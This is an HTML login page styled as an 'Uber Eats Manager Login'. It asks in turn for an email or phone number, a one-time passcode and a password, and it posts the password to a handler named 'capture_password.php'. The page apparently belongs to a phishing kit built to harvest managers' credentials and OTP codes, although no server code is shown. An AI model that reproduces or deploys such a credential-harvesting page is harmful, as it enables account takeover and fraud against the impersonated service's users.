<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uber Eats Manager Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <h2>Uber Eats Manager Login</h2>
        <form id="emailForm" method="post" action="send_otp.php">
            <label for="email">Email/Number:</label>
            <input type="text" id="email" name="email" required>
            <button type="submit">Continue</button>
        </form>
        <form id="otpForm" method="post" action="verify_otp.php" class="hidden">
            <label for="otp">OTP:</label>
            <input type="text" id="otp" name="otp" required>
            <button type="submit">Verify OTP</button>
        </form>
        <form id="googleForm" method="post" action="google_login.php" class="hidden">
            <a href="login.php" class="google-btn">
                <img src="google-logo.png" alt="Google Logo">
                Continue with Google
            </a>
        </form>
        <form id="passwordForm" method="post" action="capture_password.php" class="hidden">
            <label for="password">Uber Eats Manager Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
